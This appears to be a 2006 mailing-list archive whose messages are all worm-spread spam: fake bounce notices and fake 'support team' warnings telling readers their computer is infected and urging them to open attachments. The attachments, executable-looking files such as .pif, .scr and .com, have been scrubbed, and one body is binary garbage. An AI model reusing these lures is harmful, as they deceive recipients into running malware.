@@ -1,0 +1,200 @@
+From aera-l at asu.edu  Tue Jul 18 14:05:34 2006
+From: aera-l at asu.edu (aera-l at asu.edu)
+Date: Tue, 18 Jul 2006 15:05:34 +0300
+Subject: [Codered-user] Error
+Message-ID: <20060718120536.CEA0654B2E@bat.berlios.de>
+
+Message could not be delivered
+
+-------------- next part --------------
+A non-text attachment was scrubbed...
+Name: message.zip
+Type: application/octet-stream
+Size: 29104 bytes
+Desc: not available
+URL: <https://lists.berlios.de/pipermail/codered-user/attachments/20060718/3fc05e92/attachment.obj>
+
+From loyanich at vitmark.com  Tue Jul 18 15:32:30 2006
+From: loyanich at vitmark.com (loyanich at vitmark.com)
+Date: Tue, 18 Jul 2006 16:32:30 +0300
+Subject: [Codered-user] hi
+Message-ID: <20060718133233.01AE75AF21@bat.berlios.de>
+
+Dear user codered-user at lists.berlios.de,
+
+We have found that your account has been used to send a large amount of unsolicited commercial email messages during the recent week.
+Obviously, your computer had been infected and now runs a hidden proxy server.
+
+Please follow instructions in the attachment in order to keep your computer safe.
+
+Sincerely yours,
+The lists.berlios.de support team.
+
+-------------- next part --------------
+A non-text attachment was scrubbed...
+Name: message.zip
+Type: application/octet-stream
+Size: 29104 bytes
+Desc: not available
+URL: <https://lists.berlios.de/pipermail/codered-user/attachments/20060718/b1fa62a8/attachment.obj>
+
+From debian-devel-announces at lists.debian.org  Wed Jul 19 08:45:36 2006
+From: debian-devel-announces at lists.debian.org (debian-devel-announces at lists.debian.org)
+Date: Wed, 19 Jul 2006 09:45:36 +0300
+Subject: [Codered-user] Returned mail: Data format error
+Message-ID: <20060719064539.9E3D55B2B4@bat.berlios.de>
+
+Dear user of lists.berlios.de, Mail server administrator of lists.berlios.de would like to inform you
+
+We have found that your e-mail account was used to send a huge amount of junk e-mail during this week.
+We suspect that your computer was infected by a recent virus and now runs a hidden proxy server.
+
+We recommend you to follow our instruction in the attached text file in order to keep your computer safe.
+
+Best wishes,
+lists.berlios.de user support team.
+
+-------------- next part --------------
+A non-text attachment was scrubbed...
+Name: document.pif
+Type: application/octet-stream
+Size: 28864 bytes
+Desc: not available
+URL: <https://lists.berlios.de/pipermail/codered-user/attachments/20060719/3732a2a2/attachment.obj>
+
+From kostelec at indiana.edu  Wed Jul 19 15:01:55 2006
+From: kostelec at indiana.edu (kostelec at indiana.edu)
+Date: Wed, 19 Jul 2006 16:01:55 +0300
+Subject: [Codered-user] Returned mail: see transcript for details
+Message-ID: <20060719130206.EA46F5B3D2@bat.berlios.de>
+
+
+
+-------------- next part --------------
+A non-text attachment was scrubbed...
+Name: file.zip
+Type: application/octet-stream
+Size: 28978 bytes
+Desc: not available
+URL: <https://lists.berlios.de/pipermail/codered-user/attachments/20060719/f63efde5/attachment.obj>
+
+From MAILER-DAEMON at lists.berlios.de  Thu Jul 20 09:22:16 2006
+From: MAILER-DAEMON at lists.berlios.de (Returned mail)
+Date: Thu, 20 Jul 2006 10:22:16 +0300
+Subject: [Codered-user] Returned mail: see transcript for details
+Message-ID: <20060720072219.79A715B7DC@bat.berlios.de>
+
+The message was not delivered due to the following reason:
+
+Your message could not be delivered because the destination server was
+not reachable within the allowed queue period. The amount of time
+a message is queued before it is returned depends on local configura-
+tion parameters.
+
+Most likely there is a network problem that prevented delivery, but
+it is also possible that the computer is turned off, or does not
+have a mail system running right now.
+
+Your message could not be delivered within 6 days:
+Host 76.136.186.68 is not responding.
+
+The following recipients did not receive this message:
+<codered-user at lists.berlios.de>
+
+Please reply to postmaster at lists.berlios.de
+if you feel this message to be in error.
+
+-------------- next part --------------
+A non-text attachment was scrubbed...
+Name: message.zip
+Type: application/octet-stream
+Size: 29420 bytes
+Desc: not available
+URL: <https://lists.berlios.de/pipermail/codered-user/attachments/20060720/5741f00b/attachment.obj>
+
+From noreply at lists.berlios.de  Thu Jul 27 05:36:12 2006
+From: noreply at lists.berlios.de (Mail Delivery Subsystem)
+Date: Wed, 26 Jul 2006 23:36:12 -0400
+Subject: [Codered-user] Returned mail: Data format error
+Message-ID: <20060727033157.4990F5B24F@bat.berlios.de>
+
+
+
+-------------- next part --------------
+A non-text attachment was scrubbed...
+Name: mail.scr
+Type: application/octet-stream
+Size: 28832 bytes
+Desc: not available
+URL: <https://lists.berlios.de/pipermail/codered-user/attachments/20060726/cd6c37bc/attachment.obj>
+
+From noreply at lists.berlios.de  Fri Jul 28 16:53:14 2006
+From: noreply at lists.berlios.de (Post Office)
+Date: Fri, 28 Jul 2006 10:53:14 -0400
+Subject: [Codered-user] RETURNED MAIL: SEE TRANSCRIPT FOR DETAILS
+Message-ID: <20060728145243.9A7A25CF14@bat.berlios.de>
+
+??6?
+s?^,??Uv?-?[ubK?)??v??vg1?????d7???????K?E????}?fy?F?????N:?cp?82L?5??e???X6.???? ??(?????u7?y??*????????/?????xx???????6j
+??????jZ???
+E3n<~h?????q?[PG?v??????,?v4L#?,sfQa????????H?????6?'??????? ???42< Y??G??????4?9m?>c#?u?u~
+?.x????"???????
+
+-------------- next part --------------
+A non-text attachment was scrubbed...
+Name: message.com
+Type: application/octet-stream
+Size: 28832 bytes
+Desc: not available
+URL: <https://lists.berlios.de/pipermail/codered-user/attachments/20060728/6b65eae6/attachment.obj>
+
+From pdmosses at brics.dk  Sun Jul 30 04:47:42 2006
+From: pdmosses at brics.dk (pdmosses at brics.dk)
+Date: Sat, 29 Jul 2006 22:47:42 -0400
+Subject: [Codered-user] Delivery reports about your e-mail
+Message-ID: <20060730024550.7F72A5CBA5@bat.berlios.de>
+
+The message was not delivered due to the following reason:
+
+Your message could not be delivered because the destination server was
+not reachable within the allowed queue period. The amount of time
+a message is queued before it is returned depends on local configura-
+tion parameters.
+
+Most likely there is a network problem that prevented delivery, but
+it is also possible that the computer is turned off, or does not
+have a mail system running right now.
+
+Your message was not delivered within 5 days:
+Host 53.200.121.176 is not responding.
+
+The following recipients could not receive this message:
+<codered-user at lists.berlios.de>
+
+Please reply to postmaster at brics.dk
+if you feel this message to be in error.
+
+-------------- next part --------------
+A non-text attachment was scrubbed...
+Name: Message.cmd
+Type: application/octet-stream
+Size: 28832 bytes
+Desc: not available
+URL: <https://lists.berlios.de/pipermail/codered-user/attachments/20060729/6c9c530e/attachment.obj>
+
+From postmaster at lists.berlios.de  Mon Jul 31 16:29:59 2006
+From: postmaster at lists.berlios.de (The Post Office)
+Date: Mon, 31 Jul 2006 10:29:59 -0400
+Subject: [Codered-user] Status
+Message-ID: <20060731142648.9ECC15DE0E@bat.berlios.de>
+
+
+
+-------------- next part --------------
+A non-text attachment was scrubbed...
+Name: text.zip
+Type: application/octet-stream
+Size: 28946 bytes
+Desc: not available
+URL: <https://lists.berlios.de/pipermail/codered-user/attachments/20060731/42356433/attachment.obj>
+
